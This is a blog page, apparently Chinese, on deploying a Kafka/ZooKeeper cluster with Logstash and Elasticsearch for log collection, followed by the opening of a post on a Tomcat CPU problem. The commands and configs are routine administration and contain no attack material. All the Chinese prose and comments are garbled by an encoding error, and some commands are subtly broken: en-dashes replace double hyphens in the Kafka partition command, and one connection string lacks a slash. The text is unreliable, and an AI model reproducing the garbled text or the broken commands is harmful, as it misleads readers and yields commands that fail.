<h3 id="Kafkaå¸¸ç”¨å‘½ä»¤-æ™®åŠ"><a href="#Kafkaå¸¸ç”¨å‘½ä»¤-æ™®åŠ" class="headerlink" title="Kafkaå¸¸ç”¨å‘½ä»¤(æ™®åŠ)"></a>Kafkaå¸¸ç”¨å‘½ä»¤(æ™®åŠ)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">Kafkaå¸¸ç”¨å‘½ä»¤</div><div class="line">ä»¥ä¸‹æ˜¯kafkaå¸¸ç”¨å‘½ä»¤è¡Œæ€»ç»“ï¼š  </div><div class="line">1.æŸ¥çœ‹topicçš„è¯¦ç»†ä¿¡æ¯  </div><div class="line">./kafka-topics.sh -zookeeper 127.0.0.1:2181 -describe -topic <span class="built_in">test</span>KJ1  </div><div class="line">2ã€ä¸ºtopicå¢åŠ å‰¯æœ¬  </div><div class="line">./kafka-reassign-partitions.sh -zookeeper 127.0.0.1:2181 -reassignment-json-file json/partitions-to-move.json -execute  </div><div class="line">3ã€åˆ›å»ºtopic </div><div class="line">./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic <span class="built_in">test</span>KJ1  </div><div class="line">4ã€ä¸ºtopicå¢åŠ partition  </div><div class="line">./bin/kafka-topics.sh â€“zookeeper 127.0.0.1:2181 â€“alter â€“partitions 20 â€“topic <span class="built_in">test</span>KJ1  </div><div class="line">5ã€kafkaç”Ÿäº§è€…å®¢æˆ·ç«¯å‘½ä»¤  </div><div class="line">./kafka-console-producer.sh --broker-list localhost:9092 --topic <span class="built_in">test</span>KJ1  </div><div class="line">6ã€kafkaæ¶ˆè´¹è€…å®¢æˆ·ç«¯å‘½ä»¤  </div><div class="line">./kafka-console-consumer.sh -zookeeper localhost:2181 --from-beginning --topic <span class="built_in">test</span>KJ1  </div><div class="line">7ã€kafkaæœåŠ¡å¯åŠ¨  </div><div class="line">./kafka-server-start.sh -daemon ../config/server.properties   </div><div class="line">8ã€ä¸‹çº¿broker  </div><div class="line">./kafka-run-class.sh kafka.admin.ShutdownBroker --zookeeper 127.0.0.1:2181 --broker <span class="comment">#brokerId# --num.retries 3 --retry.interval.ms 60  </span></div><div class="line">shutdown broker  </div><div class="line">9ã€åˆ é™¤topic  </div><div class="line">./kafka-run-class.sh kafka.admin.DeleteTopicCommand --topic <span class="built_in">test</span>KJ1 --zookeeper 127.0.0.1:2181  </div><div class="line">./kafka-topics.sh --zookeeper localhost:2181 --delete --topic <span class="built_in">test</span>KJ1  </div><div class="line">10ã€æŸ¥çœ‹consumerç»„å†…æ¶ˆè´¹çš„offset  </div><div class="line">./kafka-run-class.sh kafka.tools.ConsumerOffsetChecker --zookeeper localhost:2181 --group <span class="built_in">test</span> --topic <span class="built_in">test</span>KJ1</div></pre></td></tr></table></figure>
<h3 id="Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic"><a href="#Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic" class="headerlink" title="Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic"></a>Kafkaç¾¤é›†æ–°å»ºä¸€ä¸ªTopic</h3><p>å«åšlogstash  Topic</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#æŸ¥çœ‹tocpicåˆ—è¡¨ï¼ˆ--zookeeperæŒ‡å®šä»»æ„ä¸€ä¸ªzkèŠ‚ç‚¹å³å¯ï¼Œç”¨äºè·å–é›†ç¾¤ä¿¡æ¯ï¼‰</span></div><div class="line">/usr/<span class="built_in">local</span>/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --describe</div><div class="line"> </div><div class="line"><span class="comment">#åˆ›å»ºtopicï¼ˆ--replication-factorè¡¨ç¤ºå¤åˆ¶åˆ°å¤šå°‘ä¸ªèŠ‚ç‚¹ï¼Œ--partitionsè¡¨ç¤ºåˆ†åŒºæ•°ï¼Œä¸€èˆ¬éƒ½è®¾ç½®ä¸º2æˆ–ä¸èŠ‚ç‚¹æ•°ç›¸ç­‰ï¼Œä¸èƒ½å¤§äºæ€»èŠ‚ç‚¹æ•°ï¼‰</span></div><div class="line">/usr/<span class="built_in">local</span>/kafka/bin/kafka-topics.sh --zookeeper zk1.yazuoyw.com:2181 --create --topic topic1 --replication-factor 2 --partitions 2</div><div class="line"> </div><div class="line"><span class="comment">#å‘é€æ¶ˆæ¯ï¼ˆ--topic æŒ‡å®štopicï¼‰</span></div><div class="line">/usr/<span class="built_in">local</span>/kafka/bin/kafka-console-producer.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092 --topic topic1</div><div class="line">message1</div><div class="line">message2</div><div class="line"> </div><div class="line"><span class="comment">#æ¶ˆè´¹æ¶ˆæ¯</span></div><div class="line">/usr/<span class="built_in">local</span>/kafka/bin/kafka-console-consumer.sh --zookeeper zk1.yazuoyw.com:2181 --topic topic1</div><div class="line"></div><div class="line"><span class="comment">#replicaæ£€æŸ¥</span></div><div class="line">/usr/<span class="built_in">local</span>/kafka/bin/kafka-replica-verification.sh --broker-list kafka1.yazuoyw.com:9092,kafka2.yazuoyw.com:9092,kafka3.yazuoyw.com:9092</div></pre></td></tr></table></figure>
<p>æ¯æ¡å‘å¸ƒåˆ°Kafkaé›†ç¾¤çš„æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ªç±»åˆ«ï¼Œè¿™ä¸ªç±»åˆ«è¢«ç§°ä¸ºtopicã€‚ï¼ˆç‰©ç†ä¸Šä¸åŒtopicçš„æ¶ˆæ¯åˆ†å¼€å­˜å‚¨ï¼Œé€»è¾‘ä¸Šä¸€ä¸ªtopicçš„æ¶ˆæ¯è™½ç„¶ä¿å­˜äºä¸€ä¸ªæˆ–å¤šä¸ªbrokerä¸Šä½†ç”¨æˆ·åªéœ€æŒ‡å®šæ¶ˆæ¯çš„topicå³å¯ç”Ÿäº§æˆ–æ¶ˆè´¹æ•°æ®è€Œä¸å¿…å…³å¿ƒæ•°æ®å­˜äºä½•å¤„ï¼‰</p>
<p><code>ElasticSearch</code>æœºå™¨<code>logstash</code>æŠŠæ•°æ®ä»<code>kafka</code>å­˜åˆ°<code>elasticsearch</code>çš„é…ç½®</p>
<p>å…¶ä¸­é€‰å–kafkaç¾¤é›†ä»»æ„ä¸€ä¸ªæœ‰zkçš„ipåšè¿æ¥ä½¿ç”¨</p>
<p><code>topic_id</code>å°±æ˜¯kafkaä¸­è®¾ç½®çš„<code>topic logstash</code></p>
<p>åœ¨esä¸Šé¢å®‰è£…logstashé…ç½®<br>/usr/local/logstash/config/kafka_to_es.conf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"> input &#123;</div><div class="line">    kafka &#123;</div><div class="line">                zk_connect =&gt; <span class="string">"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181/kafka"</span></div><div class="line">                group_id =&gt; <span class="string">"logstash"</span></div><div class="line">                topic_id =&gt; <span class="string">"logstash"</span></div><div class="line">                reset_beginning =&gt; <span class="literal">false</span> <span class="comment"># boolean (optional)ï¼Œ default: false</span></div><div class="line">                consumer_threads =&gt; 2  <span class="comment"># number (optional)ï¼Œ default: 1</span></div><div class="line">                decorate_events =&gt; <span class="literal">false</span> <span class="comment"># boolean (optional)ï¼Œ default: false</span></div><div class="line">        &#125;</div><div class="line">  &#125;</div><div class="line">  output &#123;</div><div class="line">    elasticsearch &#123;</div><div class="line">      hosts =&gt; [<span class="string">"10.47.88.206:9200"</span>,<span class="string">"10.47.88.188:9200"</span>]</div><div class="line">      index =&gt; <span class="string">"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;"</span></div><div class="line">&#125;</div><div class="line">   <span class="comment"># stdout &#123; codec =&gt; rubydebug &#125;</span></div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>æ–°å»ºäº†ä¸ªæµ‹è¯•çš„ï¼Œæµ‹è¯•ä¸‹å‘é€æ˜¯å¦æˆåŠŸï¼š/usr/local/logstash/config/stdin_to_es.conf </p>
<figure class="highlight puppet"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">input</span> &#123;</div><div class="line"> stdin &#123;&#125;</div><div class="line">&#125;</div><div class="line">  <span class="keyword">output</span> &#123;</div><div class="line">    elasticsearch &#123;</div><div class="line">      <span class="attr">hosts</span> =&gt; <span class="string">"10.47.88.206"</span>&#125;</div><div class="line">    <span class="keyword">stdout</span> &#123;</div><div class="line">      <span class="attr">codec</span> =&gt; rubydebug &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<h3 id="Step-2-å¯åŠ¨æœåŠ¡"><a href="#Step-2-å¯åŠ¨æœåŠ¡" class="headerlink" title="Step 2: å¯åŠ¨æœåŠ¡"></a>Step 2: å¯åŠ¨æœåŠ¡</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Kafkaç”¨åˆ°äº†Zookeeperï¼Œæ‰€æœ‰é¦–å…ˆå¯åŠ¨Zookperï¼Œä¸‹é¢ç®€å•çš„å¯ç”¨ä¸€ä¸ªå•å®ä¾‹çš„ZookkeeperæœåŠ¡ã€‚å¯ä»¥åœ¨å‘½ä»¤çš„ç»“å°¾åŠ ä¸ª&amp;ç¬¦å·ï¼Œè¿™æ ·å°±å¯ä»¥å¯åŠ¨åç¦»å¼€æ§åˆ¶å°ã€‚</div><div class="line"></div><div class="line"><span class="meta">#ç°åœ¨å¯åŠ¨Kafka:</span></div><div class="line"></div><div class="line"><span class="meta-keyword">/srv/</span>kafka<span class="meta-keyword">/bin/</span>kafka-server-start.sh -daemon config/server.properties</div><div class="line"></div><div class="line"><span class="meta">#æ·»åŠ å¼€æœºå¯åŠ¨</span></div><div class="line">echo â€˜</div><div class="line"><span class="meta"># start kafka</span></div><div class="line"><span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/kafka/</span>bin/kafka-server-start.sh -daemon <span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/kafka/</span>config/server.properties</div><div class="line">â€˜ &gt;&gt; <span class="meta-keyword">/etc/</span>rc.local</div><div class="line"> </div><div class="line"><span class="meta">#å…³é—­</span></div><div class="line"><span class="meta-keyword">/usr/</span>local<span class="meta-keyword">/kafka/</span>bin/kafka-server-stop.sh</div></pre></td></tr></table></figure>
<h3 id="kafkaé…ç½®é˜²ç«å¢™ï¼š"><a href="#kafkaé…ç½®é˜²ç«å¢™ï¼š" class="headerlink" title="kafkaé…ç½®é˜²ç«å¢™ï¼š"></a>kafkaé…ç½®é˜²ç«å¢™ï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-A INPUT -i eth0 -p tcp -m state --state NEW -m tcp --dport 4888 -j ACCEPT</div></pre></td></tr></table></figure>
<h3 id="zookeeperé›†ç¾¤"><a href="#zookeeperé›†ç¾¤" class="headerlink" title="zookeeperé›†ç¾¤"></a>zookeeperé›†ç¾¤</h3><p>æŸ¥çœ‹æˆ‘ä¹‹å‰å†™çš„è¿™ç¯‡æ–‡æ¡£ <a href="http://blog.yangcvo.me/2016/05/28/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop/zookeeper/ZooKeeper%E9%9B%86%E7%BE%A4%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BC%98%E5%8C%96/" target="_blank" rel="external">ZooKeeperçš„é›†ç¾¤å¿«é€Ÿæ­å»ºä¸ä¼˜åŒ–</a> </p>
<h3 id="èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š"><a href="#èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š" class="headerlink" title="èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š"></a>èµ°kafkaæŸ¥çœ‹æ˜¯å¦æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯åŠ¨ï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[root@kafka_03 bin]<span class="comment"># sh zkCli.sh</span></div><div class="line">Connecting to localhost:2181</div><div class="line">2017-01-04 19:20:24,849 [myid:] - INFO  [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT</div><div class="line">2017-01-04 19:20:24,853 [myid:] - INFO  [main:Environment@100] - Client environment:host.name=kafka_03</div><div class="line">2017-01-04 19:20:24,853 [myid:] - INFO  [main:Environment@100] - Client environment:java.version=1.8.0_66</div><div class="line">2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.vendor=Oracle Corporation</div><div class="line">2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.home=/srv/jdk1.8.0_66/jre</div><div class="line">2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.class.path=/srv/zookeeper-3.4.6/bin/../build/classes:/srv/zookeeper-3.4.6/bin/../build/lib/*.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-log4j12-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/slf4j-api-1.6.1.jar:/srv/zookeeper-3.4.6/bin/../lib/netty-3.7.0.Final.jar:/srv/zookeeper-3.4.6/bin/../lib/<span class="built_in">log</span>4j-1.2.16.jar:/srv/zookeeper-3.4.6/bin/../lib/jline-0.9.94.jar:/srv/zookeeper-3.4.6/bin/../zookeeper-3.4.6.jar:/srv/zookeeper-3.4.6/bin/../src/java/lib/*.jar:/srv/zookeeper-3.4.6/bin/../conf:</div><div class="line">2017-01-04 19:20:24,856 [myid:] - INFO  [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib</div><div class="line"></div><div class="line">[zk: localhost:2181(CONNECTED) 0] ls /</div><div class="line">[controller_epoch, brokers, zookeeper, kafka, dubbo, admin, isr_change_notification, consumers, config, sthp]</div><div class="line">[zk: localhost:2181(CONNECTED) 5] ls /kafka/brokers/ids</div><div class="line">[0, 1, 2]</div></pre></td></tr></table></figure>
<p>kafka ä¸‰å°é›†ç¾¤è¿™é‡Œå¯ä»¥çœ‹åˆ°è·å–åˆ°idsã€‚</p>
<h4 id="å®‰å…¨é—®é¢˜"><a href="#å®‰å…¨é—®é¢˜" class="headerlink" title="å®‰å…¨é—®é¢˜"></a>å®‰å…¨é—®é¢˜</h4><p>ç‰¹åˆ«è¦æ³¨æ„elkæ‰€æœ‰è½¯ä»¶çš„ç«¯å£ç›‘å¬,åˆ‡å‹¿æš´éœ²ç›‘å¬åˆ°å…¬ç½‘ä¸Šå»,å¦å¤–å³ä¾¿æ˜¯å†…ç½‘ä½ ä¹Ÿå¾—æ³¨æ„é…ç½®å†…ç½‘çš„è®¿é—®é™åˆ¶ã€‚</p>
<h3 id="logstash-å®¢æˆ·ç«¯å®‰è£…ï¼š"><a href="#logstash-å®¢æˆ·ç«¯å®‰è£…ï¼š" class="headerlink" title="logstash å®¢æˆ·ç«¯å®‰è£…ï¼š"></a>logstash å®¢æˆ·ç«¯å®‰è£…ï¼š</h3><h5 id="æºç å®‰è£…"><a href="#æºç å®‰è£…" class="headerlink" title="æºç å®‰è£…"></a>æºç å®‰è£…</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">æˆ‘è¿™é‡Œæºç åŒ…å®‰è£…</div><div class="line"><span class="comment"># wget https://download.elasticsearch.org/logstash/logstash/logstash-2.4.0.tar.gz</span></div><div class="line"><span class="comment">#curl -O https://download.elastic.co/logstash/logstash/logstash-2.4.0.tar.gz</span></div><div class="line"><span class="comment">#tar -zxvf logstash-2.4.0.tar.gz</span></div><div class="line"><span class="comment">#mv logstash-2.4.0 /usr/local/</span></div><div class="line"><span class="comment">#ln -s /usr/local/logstash-2.4.0/ /usr/local/logstash</span></div><div class="line"></div><div class="line">ä¸‹è½½å¯åŠ¨è„šæœ¬</div><div class="line">ç”Ÿäº§éƒ½æ˜¯è¿è¡Œåœ¨åå°çš„ï¼Œæˆ‘è¿™é‡Œæºç å®‰è£…æ²¡æœ‰initè„šæœ¬å¯åŠ¨ã€‚ å»Githubä¸‹è½½  https://github.com/benet1006/ELK_config.git</div><div class="line"><span class="comment">#cp logstash.init /etc/init.d/logstash</span></div><div class="line"><span class="comment">#chmod +x /etc/init.d/logstash</span></div><div class="line">è¿™ä¸ªè„šæœ¬æˆ‘åšè¿‡ä¿®æ”¹ã€‚</div><div class="line"></div><div class="line"><span class="comment">#å¯åŠ¨logstashæœåŠ¡</span></div><div class="line">service logstash start</div><div class="line">service logstash status</div><div class="line"></div><div class="line"><span class="comment">#æŸ¥çœ‹5000ç«¯å£</span></div><div class="line">netstat -nltp</div><div class="line"></div><div class="line">Active Internet connections (only servers)</div><div class="line">Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name</div><div class="line">tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/java</div><div class="line">tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/java</div><div class="line">tcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/java</div><div class="line">tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshd</div><div class="line">tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/node</div><div class="line">tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/java</div><div class="line">tcp 0 0 :::22 :::* LISTEN 1509/sshd</div><div class="line"></div><div class="line"></div><div class="line">ä¿®æ”¹å¯åŠ¨è„šæœ¬</div><div class="line">vim /etc/init.d/logstash </div><div class="line">æŒ‡å®šçš„ç›®å½•è‡ªå·±æºç å®‰è£…çš„è·¯å¾„ã€‚</div><div class="line"></div><div class="line">name=logstash</div><div class="line">pidfile=<span class="string">"/var/run/<span class="variable">$name</span>.pid"</span></div><div class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/jre/lib/rt.jar:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</div><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</div><div class="line">LS_USER=logstash</div><div class="line">LS_GROUP=logstash</div><div class="line">LS_HOME=/usr/<span class="built_in">local</span>/logstash å®‰è£…è·¯å¾„</div><div class="line">LS_HEAP_SIZE=<span class="string">"1000m"</span></div><div class="line">LS_JAVA_OPTS=<span class="string">"-Djava.io.tmpdir=<span class="variable">$&#123;LS_HOME&#125;</span>"</span></div><div class="line">LS_LOG_DIR=/usr/<span class="built_in">local</span>/logstash</div><div class="line">LS_LOG_FILE=<span class="string">"<span class="variable">$&#123;LS_LOG_DIR&#125;</span>/<span class="variable">$name</span>.log"</span></div><div class="line">LS_CONF_FILE=/etc/logstash.conf     æ”¶é›†æ—¥å¿—çš„è§„åˆ™conf</div><div class="line">LS_OPEN_FILES=16384</div><div class="line">LS_NICE=19</div><div class="line">LS_OPTS=<span class="string">""</span></div><div class="line"></div><div class="line">https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html</div><div class="line">è¿™ä¸ªæ˜¯<span class="built_in">log</span> stashçš„å®˜æ–¹æ–‡æ¡£çš„é…ç½®è¯´æ˜ã€‚</div><div class="line">è¿™ä¸ªé…ç½®è¯´æ˜ä¸Šé¢æˆ‘å…ˆä¿®æ”¹ä¸‹æˆ‘ä¹‹å‰çš„é…ç½®æ–‡ä»¶ã€‚</div></pre></td></tr></table></figure>
<h4 id="logstash-agenté…ç½®ï¼š"><a href="#logstash-agenté…ç½®ï¼š" class="headerlink" title="logstash agenté…ç½®ï¼š"></a>logstash agenté…ç½®ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">é…ç½®<span class="built_in">log</span> stashï¼å®ç°ç³»ç»Ÿæ—¥å¿—æ”¶é›†input</div><div class="line">file_to_kafka.conf æ—¥å¿—æ–‡ä»¶è¯»å‡ºå†™å…¥åˆ°kafka</div><div class="line">input &#123;</div><div class="line">file &#123;</div><div class="line">path =&gt; <span class="string">"/srv/tomcat/logs/account/logFile.*.log"</span></div><div class="line"><span class="built_in">type</span> =&gt; <span class="string">"tomcat"</span></div><div class="line">discover_interval =&gt; 15 <span class="comment">#logstash</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">output &#123;</div><div class="line"><span class="comment">#stdout &#123; codec =&gt; rubydebug &#125;</span></div><div class="line">kafka&#123;</div><div class="line">bootstrap_servers =&gt; <span class="string">"10.46.72.172:9092,10.47.88.103:9092,10.47.102.137:9092"</span></div><div class="line"><span class="comment">#group_id =&gt; "logstash"</span></div><div class="line">topic_id =&gt; <span class="string">"logstash"</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">2.2 logstash indexer é…ç½®</div><div class="line">kafka_to_es.conf</div><div class="line">input &#123;</div><div class="line">kafka &#123;</div><div class="line">zk_connect =&gt; <span class="string">"10.46.72.172:2181,10.47.88.103:2181,10.47.102.137:2181kafka"</span></div><div class="line">group_id =&gt; <span class="string">"logstash"</span></div><div class="line">topic_id =&gt; <span class="string">"logstash"</span></div><div class="line">reset_beginning =&gt; <span class="literal">false</span> <span class="comment"># boolean (optional)ï¼Œ default: false</span></div><div class="line">consumer_threads =&gt; 2 <span class="comment"># number (optional)ï¼Œ default: 1</span></div><div class="line">decorate_events =&gt; <span class="literal">false</span> <span class="comment"># boolean (optional)ï¼Œ default: false</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">output &#123;</div><div class="line">elasticsearch &#123;</div><div class="line">hosts =&gt; [<span class="string">"10.47.88.206:9200"</span>,<span class="string">"10.47.88.188:9200"</span>]</div><div class="line">index =&gt; <span class="string">"%&#123;host&#125;-%&#123;+YYYY.MM.dd&#125;"</span></div><div class="line">&#125;</div><div class="line"><span class="comment"># stdout &#123; codec =&gt; rubydebug &#125;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š"><a href="#eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š" class="headerlink" title="eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š"></a>eså®‰è£…æ’ä»¶headæŸ¥çœ‹ä¸‹æ•ˆæœï¼š</h4><p>ç„¶åæ‰“å¼€ç½‘ç«™ï¼š<a href="http://elk.ihaozhuo.com/_plugin/head/" target="_blank" rel="external">http://elk.ihaozhuo.com/_plugin/head/</a></p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/es_head.png" alt=""></figure></p>
<p>####kibanaç½‘ç«™æ•ˆæœï¼š</p>
<p><figure class="figure"><img src="http://7xrthw.com1.z0.glb.clouddn.com/es_kibana.png" alt=""></figure></p>
<h3 id="Communicative-learning"><a href="#Communicative-learning" class="headerlink" title="Communicative learning:"></a>Communicative learning:</h3><p>ğŸ§  Linux shell_ senior operation and maintenance faction: QQ group <code>459096184</code> circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)<br>ğŸ§  BigData-Exchange School:QQ group <code>521621407</code> circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join</p>
<p>Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.</p>

	

	

</article>




	<article>
	
		<h1><a href="/2016/12/02/WebæœåŠ¡æŠ€æœ¯/tomcat/è®°å½•tomcatè¿›ç¨‹CPUä½¿ç”¨ç‡é«˜æ’æŸ¥æ•…éšœç»éªŒ/">è®°å½•tomcatè¿›ç¨‹CPUä½¿ç”¨ç‡é«˜æ’æŸ¥æ•…éšœç»éªŒ</a></h1>
	
	<div class="article__infos">
		<span class="article__date">2016-12-02</span><br />
		
			<span class="article__category">
				<a class="article-category-link" href="/categories/Java/">Java</a>
			</span><br />
		
		
			<span class="article__tags">
			  	<a class="article__tag-link" href="/tags/Java/">Java</a> <a class="article__tag-link" href="/tags/performance-tuning/">performance tuning</a>
			</span>
		
	</div>

	

	
		<h3 id="1ã€æ•…éšœç°è±¡"><a href="#1ã€æ•…éšœç°è±¡" class="headerlink" title="1ã€æ•…éšœç°è±¡"></a>1ã€æ•…éšœç°è±¡</h3><p>è¿è¥åŒäº‹åé¦ˆAPPå…¶ä¸­ä½“æ£€å•†åŸè´­ä¹°è®¢å•ç³»ç»Ÿè¿è¡Œç¼“æ…¢ï¼Œè®¿é—®å‡ºç°è¶…æ—¶ï¼Œå¤šæ¬¡é‡å¯ç³»ç»Ÿåé—®é¢˜ä¾ç„¶å­˜åœ¨ï¼Œä½¿ç”¨topå‘½ä»¤æŸ¥çœ‹æœåŠ¡å™¨æƒ…å†µï¼Œå‘ç°CPUå ç”¨ç‡è¿‡é«˜ã€‚</p>
<h3 id="2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½"><a href="#2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½" class="headerlink" title="2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½"></a>2ã€CPUå ç”¨è¿‡é«˜é—®é¢˜å®šä½</h3><h5 id="2-1ã€å®šä½é—®é¢˜è¿›ç¨‹"><a href="#2-1ã€å®šä½é—®é¢˜è¿›ç¨‹" class="headerlink" title="2.1ã€å®šä½é—®é¢˜è¿›ç¨‹"></a>2.1ã€å®šä½é—®é¢˜è¿›ç¨‹</h5><p>ä½¿ç”¨topå‘½ä»¤æŸ¥çœ‹èµ„æºå ç”¨æƒ…å†µï¼Œå‘ç°pidä¸º14063çš„è¿›ç¨‹å ç”¨äº†å¤§é‡çš„CPUèµ„æºï¼ŒCPUå ç”¨ç‡é«˜è¾¾229.1%ï¼Œå†…å­˜å ç”¨ç‡ä¹Ÿè¾¾åˆ°äº†29.8%</p>
